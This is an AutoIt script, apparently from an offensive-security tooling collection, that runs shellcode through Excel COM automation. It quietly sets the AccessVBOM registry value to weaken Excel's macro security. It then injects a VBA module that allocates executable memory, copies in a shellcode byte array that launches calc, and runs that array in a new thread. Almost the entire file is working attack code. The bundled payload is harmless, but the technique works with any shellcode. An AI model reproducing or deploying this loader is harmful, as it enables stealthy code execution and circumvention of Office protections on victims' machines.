#NoTrayIcon
#Region ;**** Directives created by AutoIt3Wrapper_GUI ****
#AutoIt3Wrapper_Compile_Both=y
#AutoIt3Wrapper_Change2CUI=y
#EndRegion ;**** Directives created by AutoIt3Wrapper_GUI ****

#cs --------------------------------------------------------------------------------

 AutoIt Version: 3.3.14.5
 Author:         VIVI (https://github.com/V1V1) | (https://twitter.com/_theVIVI)

 Script Function:
	Executes shellcode using the Excel COM object and VBA macros.

 Notes:
	This is a direct port of excel_com_bin.nim in byt3bl33d3r's OffensiveNim
    repo (https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/excel_com_bin.nim)

#ce --------------------------------------------------------------------------------

; Title
ConsoleWrite(@CRLF & "=========== Excel COM & macros ===========" & @CRLF & @CRLF)

; Excel Version
$objExcel = ObjCreate("Excel.Application")
$objExcel.Visible = False
$appVersion = $objExcel.Version
ConsoleWrite("[i] Excel version detected on " & @ComputerName & ": " & $appVersion & @CRLF & @CRLF)

; Modifying registry key
ConsoleWrite("[*] Modifying Excel's security settings via registry." & @CRLF & @CRLF)
RegRead("HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\16.0\Excel\Security", "AccessVBOM")
If Not @error Then
    ConsoleWrite("[i] The registry key already exists." & @CRLF & @CRLF)
Else
    RegWrite("HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\" & $appVersion & "\Excel\Security", "AccessVBOM", "REG_DWORD", 1)
    ConsoleWrite("[+] Registry key modified successfully." & @CRLF & @CRLF)
EndIf

; Create VBA object in Excel
ConsoleWrite("[*] Creating VBA object in Excel." & @CRLF & @CRLF)
$objWorkbook = $objExcel.Workbooks.Add()
$xlModule = $objWorkbook.VBProject.VBComponents.Add(1)

; Insert calc shellcode
ConsoleWrite("[*] Inserting calc shellcode into VBA Macro." & @CRLF & @CRLF)

; Adapted from - https://www.scriptjunkie.us/2012/01/direct-shellcode-execution-in-ms-office-macros/
; Pops calc
$strCode = ""
$strCode &= '#If Vba7 Then' & @CRLF
$strCode &= 'Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal Zopqv As Long, ByVal Xhxi As Long, ByVal Mqnynfb As LongPtr, Tfe As Long, ByVal Zukax As Long, Rlere As Long) As LongPtr' & @CRLF
$strCode &= 'Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal Xwl As Long, ByVal Sstjltuas As Long, ByVal Bnyltjw As Long, ByVal Rso As Long) As LongPtr' & @CRLF
$strCode &= 'Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal Dkhnszol As LongPtr, ByRef Wwgtgy As Any, ByVal Hrkmuos As Long) As LongPtr' & @CRLF
$strCode &= '#Else' & @CRLF
$strCode &= 'Private Declare Function CreateThread Lib "kernel32" (ByVal Zopqv As Long, ByVal Xhxi As Long, ByVal Mqnynfb As Long, Tfe As Long, ByVal Zukax As Long, Rlere As Long) As Long' & @CRLF
$strCode &= 'Private Declare Function VirtualAlloc Lib "kernel32" (ByVal Xwl As Long, ByVal Sstjltuas As Long, ByVal Bnyltjw As Long, ByVal Rso As Long) As Long' & @CRLF
$strCode &= 'Private Declare Function RtlMoveMemory Lib "kernel32" (ByVal Dkhnszol As Long, ByRef Wwgtgy As Any, ByVal Hrkmuos As Long) As Long' & @CRLF
$strCode &= '#EndIf' & @CRLF
$strCode &= '' & @CRLF
$strCode &= 'Sub ExecShell()' & @CRLF
$strCode &= '        Dim Wyzayxya As Long, Hyeyhafxp As Variant, Zolde As Long' & @CRLF
$strCode &= '#If Vba7 Then' & @CRLF
$strCode &= '        Dim  Xlbufvetp As LongPtr, Lezhtplzi As LongPtr' & @CRLF
$strCode &= '#Else' & @CRLF
$strCode &= '        Dim  Xlbufvetp As Long, Lezhtplzi As Long' & @CRLF
$strCode &= '#EndIf' & @CRLF
$strCode &= '        Hyeyhafxp = Array(232,137,0,0,0,96,137,229,49,210,100,139,82,48,139,82,12,139,82,20, _' & @CRLF
$strCode &= '139,114,40,15,183,74,38,49,255,49,192,172,60,97,124,2,44,32,193,207, _' & @CRLF
$strCode &= '13,1,199,226,240,82,87,139,82,16,139,66,60,1,208,139,64,120,133,192, _' & @CRLF
$strCode &= '116,74,1,208,80,139,72,24,139,88,32,1,211,227,60,73,139,52,139,1, _' & @CRLF
$strCode &= '214,49,255,49,192,172,193,207,13,1,199,56,224,117,244,3,125,248,59,125, _' & @CRLF
$strCode &= '36,117,226,88,139,88,36,1,211,102,139,12,75,139,88,28,1,211,139,4, _' & @CRLF
$strCode &= '139,1,208,137,68,36,36,91,91,97,89,90,81,255,224,88,95,90,139,18, _' & @CRLF
$strCode &= '235,134,93,106,1,141,133,185,0,0,0,80,104,49,139,111,135,255,213,187, _' & @CRLF
$strCode &= '224,29,42,10,104,166,149,189,157,255,213,60,6,124,10,128,251,224,117,5, _' & @CRLF
$strCode &= '187,71,19,114,111,106,0,83,255,213,99,97,108,99,0)' & @CRLF
$strCode &= '        Xlbufvetp = VirtualAlloc(0, UBound(Hyeyhafxp), &H1000, &H40)' & @CRLF
$strCode &= '        For Zolde = LBound(Hyeyhafxp) To UBound(Hyeyhafxp)' & @CRLF
$strCode &= '                Wyzayxya = Hyeyhafxp(Zolde)' & @CRLF
$strCode &= '                Lezhtplzi = RtlMoveMemory(Xlbufvetp + Zolde, Wyzayxya, 1)' & @CRLF
$strCode &= '        Next Zolde' & @CRLF
$strCode &= '        Lezhtplzi = CreateThread(0, 0, Xlbufvetp, 0, 0, 0)' & @CRLF
$strCode &= 'End Sub' & @CRLF

$xlModule.CodeModule.AddFromString($strCode)

; Execute shellcode
ConsoleWrite("[*] Executing shellcode." & @CRLF & @CRLF)
$objExcel.Run("ExecShell")
$objExcel.DisplayAlerts = False

; Close Excel workbook
ConsoleWrite("[*] Closing Excel." & @CRLF & @CRLF)
$objWorkbook.Close(False)
ConsoleWrite("[+] Done." & @CRLF & @CRLF)
